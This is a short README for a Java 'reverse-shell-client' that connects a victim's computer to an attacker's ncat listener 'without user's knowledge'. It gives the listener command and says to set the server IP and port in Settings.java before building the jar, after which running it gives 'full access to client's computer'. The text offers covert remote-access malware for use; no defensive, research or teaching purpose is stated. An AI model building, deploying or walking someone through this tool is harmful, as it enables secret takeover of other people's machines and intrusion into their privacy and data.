# reverse-shell-client
Utility that allows connecting to a reverse shell server without user's knowledge.

The best way to run a server is to use ncat, which is a part of nmap utility. When logged on the server, use the following command:

```ncat -l -p <port>```

Remember to modify Settings.java file before building a jar file, so that it matches your server ip address and port on which ncat is listening. Running the program will automatically connect you to ther server giving a full access to client's computer.
